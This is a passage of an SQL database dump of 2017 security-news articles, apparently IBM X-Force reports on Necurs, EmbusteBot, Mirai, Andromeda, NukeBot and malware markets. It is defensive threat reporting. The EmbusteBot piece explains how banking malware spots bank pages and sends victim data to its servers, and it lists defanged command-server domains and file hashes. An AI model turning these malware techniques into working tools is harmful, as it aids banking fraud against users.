distributors, use it for pure spam, or leverage its hold on infected endpoints to   malware or   as such. Judging by its spam volume capacity, Necurs manages to infect a large number of endpoints. It is believed to control between   zombie bots, of which at least 1 million are active at any given time. A sizeable operation indeed. How does it manage to get on so many computers? It is very possible that this is exactly where Necurs’ kernel-mode feature comes in, backed up by an ability to disable security solutions, down to their actual driver components in some cases, as well as the Windows firewall. The malware ensures that it is met with little to no resistance, which was one of the most significant   infections in 2014. Domain generation algorithms (DGA) are seen in various families of malware that are used to periodically generate a large number of domain names to be used as rendezvous points with their C&C servers. Without breaking the algorithm that spews them, each domain name is unpredictable and made up of incoherent sets of letters. These domains are therefore impossible to sinkhole or use to identify malware families when examined individually. Most modern-day malware, especially banking Trojans, use DGAs to keep their communication channels with their armies of infected bots secret and undisturbed. Necurs uses not one, but  . To keep its communication channels constantly switching, Necurs employs three different sets of host names, two of which are algorithmically generated: Such feature is rare for botnet malware, and even sophisticated banking Trojans use only one DGA layer. This makes Necurs more resilient to potential interception and harder to take down overall. It is worth going back to Necurs’ early days here. Its domain name schema involved .bit domains and the use of Namecoin to access them, making them  . The intricacy of that schema was but a precursor for Necurs’ increasing technical sophistication. What’s next for Necurs, the big bad botnet and its many malicious hats? It is only a logical deduction at this point that Necurs has attracted attention from law enforcement and authorities and is a prime candidate for takedown. But judging by its resilience model, will it actually topple? In  , a number of entities partnered to take down the Dridex botnet. The elaborate operation was successful for a small amount of time. By October 2015,   thanks to the same features that continue to keep it alive. They say the way to predict behavior relies much on past behavior. If so, Necurs is bound to keep its ties with the top malware operators on the cybercrime scene. It will continue to diversify its portfolio of illicit income in 2017. Unless it is properly disrupted, we are likely to see more of its wrath. The Necurs botnet carries powerful malware, but it can never be a match for good browsing and computer hygiene practices. To keep up to date about the threats that are most relevant to your organization, join IBM’s   and tailor your feeds to receive pertinent and timely threat intelligence. Organizations looking to protect their users from malware linked with the Necurs botnet are invited to learn more about   and  . Consumers looking for best practices to protect themselves from malware infections are invited to read our   on the subject.', '\'Advanced Threats\', \'Botnets\', \'Cybercrime\', \'Dridex\', \'Gameover Zeus (GOZ)\', \'IBM X-Force Research\', \'Locky\', \'Malware\', \'Ransomware\', \'X-Force\'', 'https://securityintelligence.com/the-necurs-botnet-a-pandoras-box-of-malicious-spam/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (115, 'Life’s a Breach: Dissecting a Year of Devastating Data Breaches', 'Anshul Garg', '2017-4-13', 'Several major data breaches thrust cybersecurity into the global spotlight in 2016. In the Asia-Pacific region, for example, cybercriminals stole 100 GB of government data from the Indian state of Kerala and made off with 300 GB of voter data in the Philippines. These are just two examples of   that hit in 2016. Leaked records include data such as credit cards, passwords and personal health information (PHI) that cybercriminals traditionally covet. However, IBM X-Force also noted a shift in fraudsters’ strategies: The attackers behind many data breaches in 2016 also sought unstructured data, such as email archives, business documents, intellectual property and source code. \n According to the  , more than 4 billion records were leaked in 2016. That’s more than the combined total of the previous two years. This is unprecedented and clearly shows that the bad guys are getting smarter and data breaches are becoming more devastating. To put things into perspective, if we multiply the number of data records leaked in 2016 by the average cost per record breached in 2015 ($158), the losses can be projected at over $630 billion, per the  . Organizations need to act fast and tighten their defenses. Data breaches are prevalent across industries, but some are more at risk than others due to the sensitive nature of the data they handle. Based on publicly disclosed security events in 2016, the report revealed that the information and communications industries suffered more incidents and lost more records than any other sector.   Attacks are growing more sophisticated and causing more damage than ever. All industries are being impacted, and   are also on the rise. To assess risks and potential next steps, security leaders should ask themselves these three questions: If the answer to any of the above questions is no, you need to look for an external organization that can orchestrate your defenses and help you build a  .', '\'Cost of a Data Breach\', \'Data Breach\', \'Data Protection\', \'Data Security\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'X-Force\'', 'https://securityintelligence.com/lifes-a-breach-dissecting-a-year-of-devastating-data-breaches/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (116, 'Brazilian Malware Never Sleeps: Meet EmbusteBot', 'Maksim Shudrak', '2017-4-11', 'continually invests in the research and development of advanced malware analysis solutions that enhance IBM’s ability to quickly detect and neutralize malware as new and challenging threats arise. Our ongoing observations of the Brazilian cybercriminal landscape have revealed a perpetual rise in new malicious campaigns in this region of the world, especially those targeting online banking and payment platforms. In one of our recent collaborations with IBM Security Trusteer researchers, we analyzed new financial malware that targets dozens of major Brazilian banks. Beyond its generic capabilities, this malware employs specific schemes for different banks and allows attackers to gain full control of a victim’s endpoint. We dubbed the malware EmbusteBot, after the Portuguese word “Embuste,” meaning a hoax or scam. \n The   is known for its affinity for Delphi-based malcode, and the sample we analyzed is no exception. In this case, the malware’s authors employ a scheme where a benign executable is used to load a malicious dynamic link library (DLL) on the target endpoint to activate the payload. The DLL’s size is rather hefty — 3.3 MB — and it comes with an   library inside. The codes were statically compiled and linked together, likely used to encrypt network traffic. At the time of this writing, the malware was only detected by a small number of antivirus engines. We tested the sample and the malicious DLL on VirusTotal and observed low or generic detection in the wild (see Figure 1). One notable characteristic of this sample is the lack of code packing or encryption of potentially sensitive code paths that correspond with the malware’s malicious activity. According to X-Force, the authors did not use many anti-research techniques to make analysis harder. This oversight could be due to a lack of required competence, or the authors may have tried to make the DLL appear more legitimate for antivirus scanners without added obfuscation. The malware still performs some encryption of sensitive strings in several important parts of the DLL and time-based anti-research checks. EmbusteBot is designed to: EmbusteBot’s most likely delivery path lies in  . The malware’s execution on target endpoints begins with dynamic loading of a malicious DLL to find out what browser the victim uses and what’s on the active tab. After initialization, the malware generates a search queue where it scans for specific window class names that represent targeted web browsing applications, such as Google Chrome (see Figure 2). \n EmbusteBot checks for window classes of the top three most popular web browsers — Internet Explorer, Google Chrome and Mozilla Firefox — to determine whether any appear on the foreground of the victim’s screen. The malware further checks for active Windows 10 Store Container windows (APPLICATIONFRAMEWINDOW class name) and active Java (SUNAWTFRAME class name). When one of the required windows is found running in the foreground, the malware moves to the next step. The next step involves the GetWindowText WinAPI function used to obtain the text that appears as the window’s title on an open web browser the victim is using. The same routine ( ) is used to decrypt strings and compare them with the result of GetWindowText (see Figure 3), in search of online banking sites the victim may be using. The overall flow of events here is as follows: When it comes to specific banks, the malware may check for some additional details to make sure a concrete online banking page is indeed being navigated by the victim. Upon confirming that the victim is browsing a bank’s website and an active window was successfully matched with a target bank, EmbusteBot collects general information about the infected endpoint’s operating system (OS) and hardware environment in the following format, where XX-XX-XX-XX is the MAC address of a victim’s machine: Next, the malware sends the information to the botmaster, encoded in BASE64 format string. One of the command-and-control (C&C) server URLs we found for EmbusteBot was: www[.]calculadora05[.]debitopendentes[.]com. An additional C&C server appears to be primarily used to control the malware’s operations: www[.]20-02-2017[.]certidaonegativas[.]com. In some cases, EmbusteBot further masks its suspicious activity with a fake overlay window informing victims that a protection module is being downloaded to prevent information theft, as shown in Figure 4. It attempts to gain trust by faking a Trusteer Rapport logo. The past several years show that the Brazilian cybercriminal scene has come a long way in terms of using malware to facilitate bank fraud. Fraudsters continue to adopt various techniques to infect more potential victims. EmbusteBot is not fully generic in its activity against banks like other malware of its kind. Rather, it can add selective strategies against different bank clients while targeting the largest banks in Brazil. Hash of executable: 6c37f672722c0f4ba744e1159035feff933ddee0e1e5a59e05f3fed53be42395 Hash of malicious DLL: c3b8dba30e7c32d88b506de4cd5ddee80fcf28a339205fc50331913ba70f6d6c IBM Security has been helping banks identify and prevent the activity of financial malware, including the techniques described in this article, for years. To learn more about our anti-fraud solutions, please visit  .', '\'Advanced Malware\', \'Bank Fraud\', \'Brazil\', \'Financial Fraud\', \'Financial Malware\', \'Fraud\', \'Fraud Protection\', \'Malware\', \'Online Banking Fraud\'', 'https://securityintelligence.com/brazilian-malware-never-sleeps-meet-embustebot/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (117, 'Mirai IoT Botnet: Mining for Bitcoins?', 'Dave McMillen', '2017-4-10', 'Just in time for  , the Mirai botnet is launching attacks with a new trick up its sleeve. In February, the Mirai malware began   to widen its distribution. On the heels of our paper “ ,” published last week, IBM X-Force recently uncovered a   of the ELF Linux/Mirai malware that has a new twist: a built-in bitcoin mining component. The Mirai botnet was developed for two primary purposes: to identify and compromise Internet of Things (IoT) devices to grow the botnet, and to perform distributed denial-of-service (DDoS) attacks against predefined targets. As described in our report, several successful attacks have been launched using this botnet within the past year. The ELF Linux/Mirai malware variant was first discovered in August 2016 by white-hat security research group  . This new variant of ELF Linux/Mirai malware with the bitcoin mining component has us pondering, though. We know that as we move toward  , there may be more incentive to mine for or purchase bitcoins. Attackers certainly have much to gain from having bitcoins in their pocket to facilitate their cybercriminal activities — bitcoin is the currency of choice for   such as malware. But using IoT devices to mine for bitcoins? Almost four years ago,   discussed bitcoin mining bots; in that case, the compromised hosts were PCs. Mining bitcoins, however, is a CPU-intensive activity. How many compromised devices would it take to make the mining of bitcoin a viable revenue source for attackers? Wouldn’t attackers have better luck compromising a bitcoin exchange company, as has been the case   in the past? It’s possible they’re looking to find a way to make bitcoin mining via compromised IoT devices a lucrative venture. Here, we take a look at a recent, short-lived, high-volume ELF Linux/Mirai attack campaign using the new component, bitcoin miner slave, targeting IBM X-Force-monitored clients. \n  began seeing traffic containing links to ELF 64-bit binary files beginning in late March 2017. As shown in Figure 1, the activity was barely a blip on the screen on March 20, but then reached a 50 percent increase in volume just four days later. The activity subsided eight days after it began. What we found when we dissected the Mirai sample was pretty much the same Mirai functionality ported over from the   with a focus on attacking Linux machines running BusyBox. This software provides several stripped-down Unix tools in a single executable file and digital video recording (DVR) servers. BusyBox utilizes Telnet, which is targeted with a dictionary attack brute-force tool contained in the Mirai malware. The DVR servers are targeted because many of them use default Telnet credentials. The Telnet protocol is an   to compromising IoT devices. Aside from DVRs, many embedded system applications in IoT devices, such as routers, VoIP phones, televisions, industrial control systems and others, leverage Telnet’s remote-access capabilities. Mirai bots can perform a few different types of attacks. Besides the usual capabilities of multiple flooding tools using TCP, UDP and HTTP protocols, several other capabilities were built into WL4-A0ACM1, the aforementioned Windows version, including SQL injection and brute-force attack tools. The new ELF Linux/Mirai malware variant we discovered included another add-on: a  . This led us to question the effectiveness of a bitcoin miner running on a simple IoT device that lacks the power to create many bitcoins, if any at all. Given Mirai’s power to infect thousands of machines at a time, however, there is a possibility that the bitcoin miners could work together in tandem as one large miner consortium. We haven’t yet determined that capability, but we found it to be an interesting yet concerning possibility. It’s possible that while the Mirai bots are idle and awaiting further instructions, they could be leveraged to go into mining mode. We found the   in a web console similar to the example in Figure 2 below. We detected this site in a series of high-volume command injection attacks. The site was acting as a malware package archive repository and contained a real-time counter of victims it had infected. This file package also included a   and a  . Addressing the IoT botnet phenomenon is going to require all stakeholders to take steps to secure these devices. This includes home and enterprise users as well as manufacturers. Fortunately, our   offers recommendations for all three groups. We highly encourage readers to review the report for guidelines on how to prevent IoT devices from becoming part of a botnet. If the weaponization of IoT devices into DDoS botnets is the latest malicious trend, then turning them into   may be just around the corner.', '\'Advanced Malware\', \'Bitcoin\', \'Bitcoin Mining\', \'Botnets\', \'Internet of Things (IoT)\', \'IoT Security\', \'Malware\', \'Mirai Botnet\'', 'https://securityintelligence.com/mirai-iot-botnet-mining-for-bitcoins/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (118, 'Andromeda: A Galaxy of Pain, Coming to a Machine Near You', 'Dave McMillen', '2017-4-10', 'Although Andromeda malware was one of the   of 2016, it actually has a long history. There are many different versions of this malware, which was  . The majority of variants use myriad infection methods, including malicious attachments, phishing campaigns, warez sites and illegal download sites. Compromised hosts cause victims’ machines to be connected to the Andromeda botnet, giving attackers the ability to push additional malware onto these machines and gain unauthorized backdoor access to an infected system. Upon execution, the malicious software captures sensitive information such as authentication credentials or downloads and installs additional malicious software, such as form grabbers and rootkits, on the system. Andromeda is an extensively modular bot, and its functions can be widely modified with freely available plugins. In recent years, the malware’s authors have mainly focused on spreading Andromeda using exploit kits located on compromised websites and advertisement services. These exploit kits are mainly found on untrustworthy sites, such as porn, warez and video streaming sites, but occasionally appear on trusted sites as well. In the most recent version, 2.80, the authors appear to have shifted to a more microscopic approach aimed at the  . Andromeda is very flexible and dynamic, and the behavior and functionality of its botnet can be altered using modules. Many plugins, such as keyloggers, form grabbers, rootkits and SOCKS4 proxies, are available. Andromeda uses several RC4 keys to encrypt data for communications with command-and-control (C&C) servers to make tracking and detection difficult. It installs copies of component files instead of copies of itself, which also makes detection much more difficult. Additionally, the malware has anti-sandboxing built in to prevent security researchers from analyzing it. In the sample we found and analyzed, the Andromeda malware was mainly pushed to victims through an older phishing campaign that contained Payment Card Industry Data Security Standard (PCI DSS) compliance documents or updates for the customer service systems of the Oracle MICROS PoS suite of back-office systems. The documents contained malicious macros, which are automated scripts that install network backdoor programs to join victims’ computers to the Andromeda botnet when executed. The computers infected with the Andromeda software are   controlled by central C&C servers, and are capable of acting in concert to conduct distributed denial-of-service (DDoS) attacks or send email with more copies of the malicious software. In the particular case of the variant we analyzed, the malware also attempted to scrape the random access memory of point-of-sale (PoS) systems. PoS RAM scrapers steal payment data, such as credit card track 1 and track 2 data, from infected systems. PCI DSS requires   of sensitive payment data when it is transmitted, received or stored; this payment data is decrypted in the PoS system’s RAM for processing. Using regular expression queries, the scraper attempts to harvest the cleartext payment data and send that information to rogue C&C servers. Although Andromeda is just a well-written piece of malware that extensively uses botnet methods, it doesn’t focus on any particular use out of the box. Besides the mainstream Angler, Neutrino and Nuclear exploit kits, we observed that Andromeda focuses largely on PoS malware, such as  ,   and  , and remote-access Trojans (RATs)  ,   and  . The Andromeda interface runs from a PHP page and shows the exact geographical location of each bot. Many people outside the network security space assume that the Dark Web is the sole purveyor of malware products. In the example shown below, we see one vendor who is selling Andromeda for a very cheap price. We have also been able to retrieve freely available working code packages for multiple versions by simply just searching malware forums on the open internet. IBM X-Force is watching Andromeda’s growth and has identified the countries most infected by it. As of April 3, 2017, data from our   showed that this Andromeda has infected more than 26,000 devices, and infection rates are trending upward. The malware continues to morph and add new stealth controls. Current statistics for Andromeda can be found on the IBM X-Force Exchange. X-Force has collected over 600 MD5 hashes and many C&C servers associated with Andromeda. Most intrusion detection and prevention systems (IDPS) have some coverage for Andromeda malware. However, IDPS appliances are not designed to replace a robust antivirus solution. For the most part, Andromeda malware can be stopped as an inbound threat through employee training initiatives that teach safe computing habits and by deploying antiphishing services. To learn more about responding to threats like the Andromeda malware, watch our on-demand webinar, “ .”', '\'Advanced Threats\', \'Andromeda Botnet\', \'Botnets\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Payment Card Industry (PCI)\', \'Payment Card Industry Data Security Standard (PCI DSS)\', \'X-Force\'', 'https://securityintelligence.com/andromeda-a-galaxy-of-pain-coming-to-a-machine-near-you/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (119, 'Use Email to Manage Threat Intelligence Collections', 'Security Intelligence Staff', '2017-4-10', 'We’ve talked before about coping with  , and it would seem to follow that overwhelming email inboxes might also impede the consumption of information about threats to your organization. But what if you could make email work for you instead of against you when gathering threat intelligence to aid security investigations? The IBM X-Force Exchange includes an email inbox feature. Sometimes an email you have would be the perfect kick-start for a new collection, such as a summary a colleague sent you or a suspicious email you received. In cases like this, it’s easy to forward this email directly to the X-Force Exchange platform. With this capability, you will have all the relevant data from related report feeds automatically generated in a new collection. You can then continue to work and collaborate on the X-Force Exchange platform. There are three different places where you can use the email inbox feature: Once the email is sent, the subject of the sent email becomes the name of the collection. All found observables are attached as  . The body of the email will be the collection content with basic HTML markup preserved. To access the user inbox, go to settings by clicking on your user icon in the top right, then go to the inbox page and click the checkbox. A new email address is generated and active immediately. From now on, any emails sent to this email will create a new private collection for your X-Force Exchange account. For the group inbox, go the corresponding group page, click on the settings page and enable the inbox workflow by clicking the checkbox. Now you can instantly   with your predefined groups, whether public or private. The collection inbox is enabled in the sharing options dialog of the collection. Go to the Inbox tab and enable the inbox for this collection to continue to add valuable threat intelligence to your ongoing investigation workflow. Learn more in this short animation, or visit the   yourself to try it out!', '\'Email\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'Threat Sharing\', \'X-Force\', \'X-Force Features\'', 'https://securityintelligence.com/use-email-to-manage-threat-intelligence-collections/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (120, 'The Weaponization of IoT: Rise of the Thingbots', 'Lyndon Sutherland', '2017-4-6', 'Threat actors use botnets — networks of infected computers or devices — for various cybercriminal purposes, most significantly distributed denial-of-service (DDoS) attacks against predefined targets. Today, botnets with DDoS capabilities are even for sale on the Dark Web. In March 2016, our IBM report, “ ,” explored the botnet cybercrime landscape. How has this threat evolved? One of the most important changes, the rising use of compromised Internet of Things (IoT) devices in botnet operations, is the focus of our latest report, “ .” The IBM X-Force team has been tracking the threat from weaponized IoT devices, also known as thingbots. In the report, we examined several 2016 attacks and the motivations behind them. Most notably, we reported on the use of the Mirai botnet in several publicly disclosed DDoS attacks, as well as the exponential increase in the bandwidth involved in those attacks. In June 2016, one of these attacks  . In the months following, the threat from thingbots grew substantially. In October 2016, reports of an IoT DDoS   against a different target revealed an approximately 200 percent size increase over the attack reported in June. X-Force also observed a rise in attacks from a   of the ELF Linux/Mirai malware that, in addition to traditional DDoS capabilities, also contains a bitcoin mining component. \n Additionally, our analysis of port metrics obtained through a darknet — a block of IP addresses that should not receive any connection requests — revealed significant   on TCP ports 23, 2323 and 7547 throughout the end of 2016. These ports are associated with the Mirai botnet, which scans them looking for vulnerable IoT devices. DDoS attacks have  . The weaponization of IoT devices into attacking DDoS botnets is simply the latest trend, the current “thing” from which to create an army of bots. A recent report from   illustrated how this threat is not diminishing any time soon. One of its customers, a U.S. college, suffered a massive DDoS attack in February 2017 that lasted more than two days. According to the report, analysts believed that the perpetrators used new version of the Mirai malware that was “modified to launch more elaborate application layer attacks.” Interestingly, DVRs manufactured by the same vendor made up 56 percent of all IPs used in the attack. There are   underlying a majority of issues with IoT. As DDoS attacks have become more potent and more common, we have witnessed a parallel proliferation of DDoS mitigation services, an arms race of sorts. Whether it’s a computer, mobile device or appliance, anything connected to the internet could become  . The proliferation of IoT devices will accelerate substantially — they are expected to account for more than two-thirds of the 34 billion connected devices  . It is vital that organizations and consumers look to implement IoT security best practices. Refer to the   to find out how to prevent your IoT device from becoming part of a massive botnet.', '\'Botnets\', \'Distributed Denial-of-Service (DDoS)\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Internet of Things (IoT)\', \'IoT Security\', \'Malware\', \'X-Force\'', 'https://securityintelligence.com/the-weaponization-of-iot-rise-of-the-thingbots/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (121, 'Cybercriminals Riding Tax Filing Tides: Tax Fraud Season in Effect', 'Limor Kessem', '2017-4-5', 'Data theft is a year-round, opportunistic crime, but seasonal events often trigger rises in spam and fraud. The most significant such example is tax fraud riding the wave of tax filing season. Every year,  , which extends from January to April in the U.S., is one of the most popular opportunities for cybercriminals to perpetrate scam ploys. As soon as January rolls around, the volume of email flooding potential victims with tax return-themed spam begins rising gradually. The most common crimes that ensue are   on the consumer side and W-2 fraud on the business side. \n IBM X-Force researchers looked into the various spam traps for a glimpse into the  , and the numbers are already there. For two of the spam email examples we provided in our report, we saw a 393 percent increase from December 2016 to February 2017. We expect this rise to continue into April 2017 and to see new scam types appear well after the filing deadline passes as people wait for their refund notices to come through. In this report, we’ll answer the following questions about tax fraud: What kinds of tax records are cybercriminals selling on the Dark Web? What kinds of ploys are they using? What can be facilitated with your information or information  ? To learn more about the most current tax season scams targeting consumers and businesses, download our report “ .”', '\'Financial Fraud\', \'Fraud\', \'Fraud Prevention\', \'Phishing Emails\', \'Spam Emails\', \'Tax Fraud\', \'Tax Refund Fraud\'', 'https://securityintelligence.com/cybercriminals-riding-tax-filing-tides-tax-fraud-season-in-effect/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (122, 'Commercial Malware Makes a Comeback in 2016', 'Limor Kessem', '2017-3-29', 'Among the trends identified in the   for 2017 was the notable reemergence of commercial malware in the fraud underground. Commercial malware is defined as malicious code that can be purchased or rented in software-as-a-service (SaaS) mode, sometimes in SaaS models, by cybercriminal buyers. The most popular types of malcode we observed in 2016 were Android malware, banking Trojans, ransomware offerings and   vendors. Since DDoS tools are mostly sold as a service and not as malware per se, we will focus here on banking Trojans, Android malware and ransomware. Many antifraud professionals remember that banking Trojan sales saw a sharp dip in most underground boards ever since law enforcement   of the internet’s underbelly in 2010 to 2012. It was a time when the Zeus Trojan’s author made the  , SpyEye’s creator got   in the U.S. and Gozi’s mastermind got   by U.S. law enforcement. With an increasingly palpable fear of law enforcement, most of those selling malware in the underground, aside from  , scattered, leaving only some low-level Zeus vendors to sell executable files generated from their existing malware builders. By 2014, even Citadel stopped selling in the underground and no actual developers were willing to openly sell full-kit banking Trojans with a modules package, a proper license, and the bug fixes and tech support fraudsters got used to buying directly from the malware’s own author. But commercial banking Trojans have since found a way to make a comeback of sorts. In 2016, we witnessed a few notable occurrences in that regard. \n 2016 was a notable year for the Zeus Trojan. Although it is one of the oldest commercial codes out there, it is also one of the most financially damaging banking Trojans in cybercrime history. The leak of the   in 2011 gave rise to numerous projects based on that same code in its entirety. Let’s take the latest of the bunch, FlokiBot, Zeus Panda and Zeus Sphinx, as examples. These three were featured in new attack sprees in 2016, keeping Zeus at the top of the list of 2016’s most active   in the wild. Each of these live iterations of Zeus’s code was notable in its own way.  emerged in Dark Web marketplaces such as Alpha Bay in October 2016 with a $1,000 price tag. This malware improved on Zeus’s code and added the targeting of point-of-sale (POS) endpoints to steal payment card data. To date, FlokitBot was used mostly to target banks and payment card data  .  botnets first emerged as a commercial offering in early 2016. As of February 2016, Panda variants were detected in actual  , spread through poisoned Word macros and exploit kits. By summer of 2016, Panda started  , right on time for an international sporting event, which is an extremely busy time for any hosting country. X-Force research noted that Panda was already fitted with a special Boleto payments module to steal money via this popular platform in Brazil. Zeus Sphinx is another commercial Trojan based on Zeus that emerged in the underground in 2015. It was   for $500 per kit. Sphinx may have been active since 2015, but it started considerably ramping up its activity in 2016,   starting in the summer of 2016. According to X-Force research, Sphinx also saw some code upgrades and a new targets lists that included   in late 2016 and early 2017. Offered for sale in underground forums in 2016, these Trojans gave the Zeus code yet another run among cybercriminals, enabling both new and existing actors to mount and operate new banking Trojan botnets. In December 2016, a malware developer with an ongoing banking Trojan project showed up in underground forums, aspiring to sell some licenses as he worked on completing the development of all its modules. The actor promised to deliver future capabilities, such as a Socket Secure (SOCKS) proxy and hidden virtual network computing (hVNC) alongside technical support and free bug fixes. The malware was named Nuclear Bot, or  , at the time. To start, the developer, who went by the online alias Gosya, boasted that he wrote the malware from scratch, not leveraging any code from leaked sources such as Zeus, Carberp or other Trojans. By January 2017, it appeared that Gosya decided to rename the malware and market it as Micro Banking Trojan. Gosya’s efforts to inform others about the malware in different forums eventually led to him being   after he used multiple aliases to post more adverts. This case is notable because it could bring a new banking Trojan into the cybercrime arena. Although we have yet to see NukeBot/Micro Bot active in the wild, analyses performed by X-Force and   found that it has the potential to rise in 2017 and bring back commercial Trojan sales in the underground. Given the complexity associated with obtaining and operating banking Trojans, that endeavor is often left to a narrower crowd of particularly tech-savvy cybercriminals, leaving a void in the fraudster underground and a demand that is not met with sufficient supply. Enter Android banking malware. In 2016, the ongoing evolution of Android malware and a breakthrough in the shape of overlay capabilities that can mimic Trojan webinjections marked the dawn of a new era for the commercial malware scene. Overlay Android Trojans such as GM Bot and  , provided they can properly infect targeted devices, can be very similar to banking malware for the PC. They have thus become quite popular among fraudsters looking to make an easy dollar and remain attractive to the more professional cybercrime factions that use them for online banking fraud. Overlay Trojans have notable capabilities that resemble banking Trojans from the PC: These capabilities can enable Android overlay malware operators to defraud victims’ bank accounts, making them   among cybercriminals. IBM X-Force researchers followed the trend in 2016 and found that the Android malware market is   with new vendors coming into the scene, but also leaving quickly most times. The reason this happens is not new: Malware authors may be good developers, but they are not necessarily good customer service personas. Developers often attempt to sell the malware, but become overwhelmed with customers’ demands for technical support. This sometimes causes developers to stop selling their malware publicly. Another way to spread Android malware is to leak Trojan source codes in the underground. In fact, this is often done intentionally. One such case took place in early 2016, when the   was leaked by one of its developer’s customers. A number of   are already based on GM Bot’s source code, and this leak only meant more hands on the same code. But GM Bot went nowhere after the mishap. By March 2016, its author   of the code, continuing to sell it in the underground just before being banned. Nonetheless, by October 2016, X-Force researchers had discovered a   capable of operating on Android M distributions. Since GM Bot is still an active project, the developer will likely continue to offer it commercially, if not in underground forums, and then offer it to new, trusted buyers referred by existing ones. Another strong rising contender in the underground arena has been ransomware. A variety of commercial ransomware models were offered to cybercriminals of all skill levels in 2016. Ransomware saw   in 2016. With over 4,000 attacks per day, reported losses rising 770 percent since 2015, and a 6,000 percent hike in spam-carrying ransomware, law enforcement warned that there may be  . One of the most notable things about ransomware’s sustained popularity is its widespread availability for cheap — sometimes even for free. Some ransomware codes are available as open source code that malicious developers can pick up and render operational. As such, these codes are free to obtain, test and even illicitly use. Lower grade codes are offered for a low cost, sometimes under $100. Second-rate ransomware such as Alpha Locker, for example, is sold for $65. \n \n Commodity sale of the ransomware kit is available through a variety of vendors. For example, the popular Cerber ransomware was   on a Russian-speaking Dark Web forum. Ransomware-as-a-service (RaaS) vendors make their malware available over a platform that can accommodate numerous criminals. Some RaaS offerings, such as  , allow fraudsters to pay periodically to use the vendor’s malware. \n \n Ransomware affiliates and profit-share vendors pull in a large number of collaborators to spread the malware and gain illicit profits from the operation of ransomware. A fraudster might join a profit-share scheme in which the original vendor, for example, maintains the malware’s code and cryptocurrency receipt infrastructure while the accomplice uses the malware at no cost, infecting as many victims are possible. In return for infecting new victims, partners in such profit-sharing arrangement receive 70 percent of whatever payments victims send, and the vendor keeps a 30 percent cut. Take, for instance, the  , which was advertised on the Dark Web in the summer of 2016. \n \n These models, which often come with technical support, offer yet another way for cybercriminals to   left by the low supply of banking Trojans in the underground. They also add diversity in malware types, which enables more malicious actors to find the right fit for their own nefarious goals. Ransomware lowers the bar for cybercriminals in the underground because it is relatively easy to infect users and quite simple to operate, especially compared to banking Trojans. Judging by the numerous   attacks in 2016, this malware type has allowed more newcomers to join the ranks of cybercrime and reinforced the interest of veteran attackers. \n Cybercrime is a vast, dark economy that is expected to cause an estimated   by 2019. The commercial underground, where cybercriminals buy, sell and exchange information, tools, and accomplices, is a worldwide network that supports its own growth. In 2016, Arizona State University researchers used Dark Web crawling and mining to discover that   emerge each week in forums and hosting sites hidden via Tor services and other anonymizers. Commercially available malware is only one of the types of offerings up for sale by cybercrime vendors. When it comes to real-world losses, however, it is one of the most significant threats, affecting consumers and businesses alike. Seeing the growing popularity of what’s considered to be lower grade malware in the underground, X-Force research expects to see this trend continue and intensify in 2017. To read additional observations about shifts in the security landscape, read the full  .', '\'Advanced Malware\', \'Cybercrime\', \'Financial Malware\', \'IBM X-Force Research\', \'Malware\', \'Ransomware\', \'Ransomware-as-a-Service (RaaS)\', \'Software-as-a-Service (Saas)\', \'X-Force\'', 'https://securityintelligence.com/commercial-malware-makes-a-comeback-in-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (123, '2016: The Year of the Mega Breach', 'Michelle Alvarez', '2017-3-29', '“Excuse me, are you aware of what’s happening right now? We’re facing 20 billion security events every day. DDoS campaigns, ransomware, malware attacks …” says a woman sternly to an associate in a recently aired   featuring Watson and IBM Security. She may have been an actor, but the question and the threats she described plague real-world organizations and their security operations teams daily.   IBM X-Force knows the difficulties organizations face when it comes to finding time to step back from day-to-day operations to look at the big security picture. Because of this, they may be left with many unanswered questions, such as: \n Fortunately,   takes the guesswork out of assessing the security threat landscape for organizations with the IBM X-Force Threat Intelligence Index. To form assessments regarding the threat landscape, X-Force researchers draw on numerous data sources to include both data from monitored security clients — billions of events per year from more than 8,000 client devices in more than 100 countries — and data derived from noncustomer assets, such as spam sensors and honeynets. The following key trends point to a continued need to focus on security fundamentals. For a closer look at the full cyberthreat landscape for 2016, download the complete  .', '\'Data Breach\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Security Breach\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/2016-the-year-of-the-mega-breach/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (124, 'The NukeBot Trojan, a Bruised Ego and a Surprising Source Code Leak', 'Limor Kessem', '2017-3-28', 'In early December 2016, IBM X-Force researchers noticed the emergence of a new banking malware advertised for sale in a few underground boards. The malware’s vendor, who went by the online moniker Gosya, was a Russian-speaking member who introduced himself as the developer of Nuclear Bot, or  , a modular banking Trojan. Considering the demand for commercially available malware in the cybercrime community, this malware should have been accepted very eagerly. But instead, its developer’s user account was banned from multiple forums. In March 2017, the source code was leaked, apparently by the developer himself. What led to this leak, and what impact can we expect as a result? In cybercrime forums, and especially in the more closed and Russian-speaking communities, members earn credibility by following certain customary steps. To begin, they must be introduced by a known member and vetted by the community according to what they can offer. Most importantly, they must gain the trust of the administrators running the board. When Gosya joined  , he apparently did not follow all the customary steps. He was introduced by a known member but took some wrong turns from there. Immediately upon joining, Gosya began advertising a new banking malware for sale. According to X-Force research observations, he did not have the malware tested and certified by forum admins, nor did he provide any test versions to members. At the same time, he was attacked by existing competition, namely the FlokiBot vendor, who wanted to get down to the technical nitty gritty with him and find out if Gosya’s claims about his malware’s capabilities were indeed viable. In posts where he replied to challenging questions, Gosya got nervous and defensive, raising 